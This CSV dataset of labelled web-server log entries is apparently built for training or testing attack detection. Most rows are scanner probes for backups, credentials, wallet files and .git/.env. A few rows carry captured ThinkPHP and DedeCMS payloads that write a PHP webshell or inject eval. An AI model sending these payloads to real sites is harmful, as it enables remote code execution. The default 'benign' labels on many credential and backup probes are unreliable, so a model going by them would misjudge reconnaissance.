source_log,timestamp,ip,method,path,query,path_with_query,protocol,status,bytes,referer,user_agent,label,label_source,label_reason,text
2022-12-22,2022-12-22T12:04:18-08:00,212.30.33.26,HEAD,/back/www.tar,,/back/www.tar,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:06:12-08:00,85.206.175.219,HEAD,/old/bak.tar,,/old/bak.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:06:16-08:00,45.89.242.199,HEAD,/back/.bash_history,,/back/.bash_history,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:53:35-08:00,196.244.192.37,HEAD,/bak/public_html.rar,,/bak/public_html.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:45:12-08:00,212.30.33.24,HEAD,/sql.sql,,/sql.sql,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:54:11-08:00,98.159.226.185,HEAD,/back/secrepo.com.sql,,/back/secrepo.com.sql,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:32:26-08:00,45.86.200.149,HEAD,/ftpsync.settings,,/ftpsync.settings,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/ftpsync.settings QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:43:23-08:00,85.10.56.247,HEAD,/backup/www.sql,,/backup/www.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:30:31-08:00,98.159.226.30,HEAD,/website.tar,,/website.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:29:23-08:00,85.203.45.13,HEAD,/old/secrepo.com.sql,,/old/secrepo.com.sql,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:17:55-08:00,85.203.45.12,HEAD,/bak/backup.sql,,/bak/backup.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:16:59-08:00,98.159.226.26,HEAD,/restore/config.json,,/restore/config.json,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:45:17-08:00,196.244.192.14,HEAD,/restore/website.tar,,/restore/website.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:18:52-08:00,212.30.37.138,HEAD,/backups/bak.tar,,/backups/bak.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:48:10-08:00,185.92.25.49,HEAD,/backups/public_html.tar,,/backups/public_html.tar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:26-07:00,44.195.86.98,GET,/sites/all/libraries/elfinder/elfinder.php.html,,/sites/all/libraries/elfinder/elfinder.php.html,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:54:03-08:00,45.86.200.152,HEAD,/backups/backup.sql,,/backups/backup.sql,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:54:23-08:00,98.159.226.185,HEAD,/bak/backup.sql.tar,,/bak/backup.sql.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:57:05-08:00,188.212.135.138,HEAD,/public_html.rar,,/public_html.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:04:55-08:00,45.92.228.148,HEAD,/backup/directory.rar,,/backup/directory.rar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:48:14-08:00,85.206.166.81,HEAD,/public_html.tar,,/public_html.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:40:11-08:00,45.86.200.156,HEAD,/backups/www.tar,,/backups/www.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:19:45-08:00,45.86.200.121,HEAD,/bak/directory.rar,,/bak/directory.rar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:17:16-08:00,82.118.30.79,HEAD,/restore/secrepo.com.sql,,/restore/secrepo.com.sql,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:07:00-08:00,98.159.226.71,HEAD,/backup.sql.tar,,/backup.sql.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:27:51-08:00,194.169.217.33,HEAD,/backup/backup.tar,,/backup/backup.tar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:28:49-08:00,45.130.202.87,HEAD,/backup/backup.rar,,/backup/backup.rar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:01:19-08:00,98.159.226.28,HEAD,/backup/sftp-config.json,,/backup/sftp-config.json,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:30:32-08:00,212.30.37.116,HEAD,/backup/mysql.sql,,/backup/mysql.sql,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:07-07:00,125.78.229.99,GET,/,"s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>","/?s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>",HTTP/1.1,418,746,"http://www.secrepo.com/?s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>",Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:command_exec,Code execution/webshell pattern,"METHOD=GET PATH=/ QUERY=s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?> PROTOCOL=HTTP/1.1"
2022-12-22,2022-12-22T15:48:11-08:00,157.97.120.41,GET,/.git/info/refs,service=git-upload-pack,/.git/info/refs?service=git-upload-pack,HTTP/1.1,301,495,,git/2.17.1,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/.git/info/refs QUERY=service=git-upload-pack PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:18:42-08:00,45.86.200.159,HEAD,/back/.env,,/back/.env,HTTP/1.1,404,275,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/back/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:57:44-08:00,82.118.30.19,HEAD,/restore/directory.tar,,/restore/directory.tar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:56:38-08:00,196.196.106.70,HEAD,/bak/config.json,,/bak/config.json,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:20:49-08:00,98.159.226.21,HEAD,/backups/backup.tar,,/backups/backup.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:38:57-08:00,45.130.202.106,HEAD,/backups/wallet.dat,,/backups/wallet.dat,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:17:37-08:00,45.91.20.120,HEAD,/bak/secrepo.com.rar,,/bak/secrepo.com.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:13:49-08:00,45.86.200.138,HEAD,/back/wallet.dat,,/back/wallet.dat,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:18:16-08:00,82.118.30.30,HEAD,/.well-known.zip,,/.well-known.zip,HTTP/1.1,301,182,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:50:29-08:00,217.138.202.70,HEAD,/backups/website.tar,,/backups/website.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:53:01-08:00,85.203.45.83,HEAD,/restore/www.tar,,/restore/www.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/www.tar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T04:07:56-07:00,137.184.154.55,GET,/.env,,/.env,HTTP/1.1,404,519,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:13:55-08:00,188.212.135.120,HEAD,/backup.tar,,/backup.tar,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:01:23-08:00,185.217.117.41,HEAD,/backup/sql.sql,,/backup/sql.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:20:30-08:00,194.169.217.22,HEAD,/backups/website.rar,,/backups/website.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:29:56-08:00,217.138.202.70,HEAD,/backup/backup.sql,,/backup/backup.sql,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:02:42-08:00,45.91.20.105,HEAD,/wallet.dat,,/wallet.dat,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:58:14-08:00,98.159.226.188,HEAD,/backup/bak.rar,,/backup/bak.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:00:13-08:00,45.86.200.152,HEAD,/back/backup.sql.tar,,/back/backup.sql.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:52:38-08:00,185.192.16.13,HEAD,/back/sql.sql,,/back/sql.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:12:49-08:00,98.159.226.189,HEAD,/bak/directory.tar,,/bak/directory.tar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:42:29-08:00,185.192.16.14,HEAD,/restore/backup.sql.tar,,/restore/backup.sql.tar,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:44:58-08:00,185.217.117.36,HEAD,/backup/wallet.dat,,/backup/wallet.dat,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:41:45-08:00,82.118.30.82,HEAD,/bak/bak.tar,,/bak/bak.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:13:21-08:00,98.159.226.31,HEAD,/back/secrepo.com.rar,,/back/secrepo.com.rar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:28:03-08:00,85.203.45.142,HEAD,/backup/credentials.txt,,/backup/credentials.txt,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:31:19-08:00,45.134.22.88,HEAD,/bak/secrepo.com.sql,,/bak/secrepo.com.sql,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:29-07:00,44.195.86.98,GET,/up.php,,/up.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/up.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:23-08:00,196.196.106.70,HEAD,/directory.tar,,/directory.tar,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:48:30-08:00,98.159.226.181,HEAD,/backup/www.tar,,/backup/www.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:52:56-08:00,185.192.16.12,HEAD,/restore/public_html.rar,,/restore/public_html.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:57:42-08:00,194.169.217.14,HEAD,/back/backup.rar,,/back/backup.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:04:51-08:00,98.159.226.189,HEAD,/backup/www.rar,,/backup/www.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:38:15-08:00,45.128.199.211,HEAD,/backup/website.rar,,/backup/website.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/website.rar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:06-07:00,125.78.229.99,GET,/uploads/dede/sys_verifies.php,"action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();//","/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();//",HTTP/1.1,418,746,http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\%22;eval($_POST[ysy]);die();//,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,"METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();// PROTOCOL=HTTP/1.1"
2022-12-22,2022-12-22T16:07:56-08:00,98.159.226.31,HEAD,/restore/sftp-config.json,,/restore/sftp-config.json,HTTP/1.1,301,191,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T09:09:50-07:00,3.82.236.130,GET,/Datasets Description/Network/http.html,,/Datasets Description/Network/http.html,HTTP/1.1,200,1709,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:08-07:00,125.78.229.99,GET,/,"s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$","/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$",HTTP/1.1,418,746,"http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$",Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:command_exec,Code execution/webshell pattern,"METHOD=GET PATH=/ QUERY=s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ PROTOCOL=HTTP/1.1"
2022-12-22,2022-12-22T12:19:11-08:00,45.95.243.87,HEAD,/restore/backup.tar,,/restore/backup.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:26:59-08:00,85.206.166.83,HEAD,/secrepo.com.sql,,/secrepo.com.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:38:38-08:00,45.91.20.120,HEAD,/old/backup.tar,,/old/backup.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:08:14-08:00,98.159.226.184,HEAD,/restore/www.rar,,/restore/www.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:05:22-08:00,85.206.175.219,HEAD,/old/directory.rar,,/old/directory.rar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:38:52-08:00,185.192.16.37,HEAD,/old/dump.sql,,/old/dump.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:49:19-08:00,85.10.56.231,HEAD,/dump.sql,,/dump.sql,HTTP/1.1,301,175,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:57:39-08:00,98.159.226.17,HEAD,/backup/public_html.rar,,/backup/public_html.rar,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:23:17-08:00,98.159.226.31,HEAD,/old/public_html.rar,,/old/public_html.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:02:55-08:00,98.159.226.26,HEAD,/back/public_html.tar,,/back/public_html.tar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:42:16-08:00,185.195.19.200,HEAD,/old/credentials.txt,,/old/credentials.txt,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:46:14-08:00,84.247.59.178,HEAD,/back/config.json,,/back/config.json,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-23T01:32:57-08:00,150.136.26.54,GET,/.git/config,,/.git/config,HTTP/1.1,301,497,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/.git/config QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:09:23-08:00,45.134.22.112,HEAD,/bak.tar,,/bak.tar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:28:41-08:00,82.118.30.8,HEAD,/old/backup.sql,,/old/backup.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:24:12-08:00,212.30.36.228,HEAD,/restore/credentials.txt,,/restore/credentials.txt,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:26-07:00,44.195.86.98,GET,/uploads/up.php,,/uploads/up.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/uploads/up.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:47:32-08:00,185.192.71.172,HEAD,/restore/public_html.tar,,/restore/public_html.tar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:30:52-08:00,185.192.16.12,HEAD,/backup/config.json,,/backup/config.json,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/config.json QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T22:18:27-07:00,66.102.7.211,GET,/Datasets Description/PE_malware/VirusShare.html,,/Datasets Description/PE_malware/VirusShare.html,HTTP/1.1,200,1651,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Google-PageRenderer Google (+https://developers.google.com/+/web/snippet/)",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:38:14-08:00,85.206.166.82,HEAD,/credentials.txt,,/credentials.txt,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:53-08:00,45.86.201.22,HEAD,/bak/.bash_history,,/bak/.bash_history,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:53:36-08:00,45.130.136.24,HEAD,/restore/wallet.dat,,/restore/wallet.dat,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/wallet.dat QUERY= PROTOCOL=HTTP/1.1
